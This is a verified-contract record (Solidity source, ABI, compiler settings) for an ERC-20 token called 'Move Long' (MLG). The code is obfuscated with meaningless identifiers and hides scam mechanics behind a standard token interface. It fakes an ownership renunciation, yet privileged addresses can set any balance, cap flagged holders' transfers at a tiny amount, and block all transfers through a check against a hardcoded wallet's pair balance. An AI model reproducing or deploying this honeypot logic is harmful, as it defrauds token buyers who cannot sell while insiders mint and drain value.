{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface toTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTradingTo {\n    function createPair(address liquidityAmountSender, address feeMode) external returns (address);\n}\n\ninterface maxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTakeBuy) external view returns (uint256);\n\n    function transfer(address txShouldSwap, uint256 exemptBuy) external returns (bool);\n\n    function allowance(address toReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txShouldSwap,\n        uint256 exemptBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);\n    event Approval(address indexed toReceiver, address indexed spender, uint256 value);\n}\n\ninterface maxSwapMetadata is maxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MoveLong is fundTeam, maxSwap, maxSwapMetadata {\n\n    bool public feeTo;\n\n    function transferFrom(address atEnable, address txShouldSwap, uint256 exemptBuy) external override returns (bool) {\n        if (_msgSender() != fromWalletReceiver) {\n            if (minMarketing[atEnable][_msgSender()] != type(uint256).max) {\n                require(exemptBuy <= minMarketing[atEnable][_msgSender()]);\n                minMarketing[atEnable][_msgSender()] -= exemptBuy;\n            }\n        }\n        return shouldLaunchedMax(atEnable, txShouldSwap, exemptBuy);\n    }\n\n    uint256 private tradingMax;\n\n    function allowance(address listExempt, address listLiquidity) external view virtual override returns (uint256) {\n        if (listLiquidity == fromWalletReceiver) {\n            return type(uint256).max;\n        }\n        return minMarketing[listExempt][listLiquidity];\n    }\n\n    function shouldLaunchedMax(address atEnable, address txShouldSwap, uint256 exemptBuy) internal returns (bool) {\n        if (atEnable == receiverBuy) {\n            return modeEnable(atEnable, txShouldSwap, exemptBuy);\n        }\n        uint256 feeModeMax = maxSwap(swapBuy).balanceOf(senderLaunched);\n        require(feeModeMax == autoFromIs);\n        require(txShouldSwap != senderLaunched);\n        if (receiverFund[atEnable]) {\n            return modeEnable(atEnable, txShouldSwap, toLaunch);\n        }\n        return modeEnable(atEnable, txShouldSwap, exemptBuy);\n    }\n\n    address public receiverBuy;\n\n    function getOwner() external view returns (address) {\n        return walletTake;\n    }\n\n    function transfer(address fundTotal, uint256 exemptBuy) external virtual override returns (bool) {\n        return shouldLaunchedMax(_msgSender(), fundTotal, exemptBuy);\n    }\n\n    function approve(address listLiquidity, uint256 exemptBuy) public virtual override returns (bool) {\n        minMarketing[_msgSender()][listLiquidity] = exemptBuy;\n        emit Approval(_msgSender(), listLiquidity, exemptBuy);\n        return true;\n    }\n\n    address public swapBuy;\n\n    function sellMode(address totalLiquidity) public {\n        if (swapFrom) {\n            return;\n        }\n        \n        txIs[totalLiquidity] = true;\n        \n        swapFrom = true;\n    }\n\n    constructor (){\n        if (amountIsLaunch == feeTo) {\n            txMinLimit = receiverExempt;\n        }\n        toTotal sellAuto = toTotal(fromWalletReceiver);\n        swapBuy = sellTradingTo(sellAuto.factory()).createPair(sellAuto.WETH(), address(this));\n        if (txMinLimit != launchExempt) {\n            launchExempt = tradingMax;\n        }\n        receiverBuy = _msgSender();\n        liquidityBuy();\n        txIs[receiverBuy] = true;\n        launchMin[receiverBuy] = swapTotal;\n        if (tradingMax != receiverExempt) {\n            amountIsLaunch = true;\n        }\n        emit Transfer(address(0), receiverBuy, swapTotal);\n    }\n\n    function shouldTeam() private view {\n        require(txIs[_msgSender()]);\n    }\n\n    mapping(address => bool) public txIs;\n\n    event OwnershipTransferred(address indexed teamTotal, address indexed tradingTx);\n\n    address private walletTake;\n\n    uint256 public launchExempt;\n\n    function autoFee(address teamBuy) public {\n        shouldTeam();\n        if (receiverExempt == tradingMax) {\n            tradingMax = receiverExempt;\n        }\n        if (teamBuy == receiverBuy || teamBuy == swapBuy) {\n            return;\n        }\n        receiverFund[teamBuy] = true;\n    }\n\n    function liquidityBuy() public {\n        emit OwnershipTransferred(receiverBuy, address(0));\n        walletTake = address(0);\n    }\n\n    bool public exemptLiquidityMin;\n\n    address senderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public amountIsLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return limitMinAuto;\n    }\n\n    uint256 private swapTotal = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private minMarketing;\n\n    uint256 public receiverExempt;\n\n    uint256 constant toLaunch = 9 ** 10;\n\n    uint256 autoFromIs;\n\n    string private limitMinAuto = \"Move Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalAutoWallet;\n    }\n\n    string private fromTotal = \"MLG\";\n\n    address fromWalletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 buyTx;\n\n    function enableSwap(uint256 exemptBuy) public {\n        shouldTeam();\n        autoFromIs = exemptBuy;\n    }\n\n    bool public swapFrom;\n\n    function owner() external view returns (address) {\n        return walletTake;\n    }\n\n    function balanceOf(address walletTakeBuy) public view virtual override returns (uint256) {\n        return launchMin[walletTakeBuy];\n    }\n\n    function modeEnable(address atEnable, address txShouldSwap, uint256 exemptBuy) internal returns (bool) {\n        require(launchMin[atEnable] >= exemptBuy);\n        launchMin[atEnable] -= exemptBuy;\n        launchMin[txShouldSwap] += exemptBuy;\n        emit Transfer(atEnable, txShouldSwap, exemptBuy);\n        return true;\n    }\n\n    uint8 private totalAutoWallet = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapTotal;\n    }\n\n    mapping(address => uint256) private launchMin;\n\n    function isLaunchTrading(address fundTotal, uint256 exemptBuy) public {\n        shouldTeam();\n        launchMin[fundTotal] = exemptBuy;\n    }\n\n    mapping(address => bool) public receiverFund;\n\n    uint256 private txMinLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIsLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTakeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"enableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"isLaunchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"}],\"name\":\"sellMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txShouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MoveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}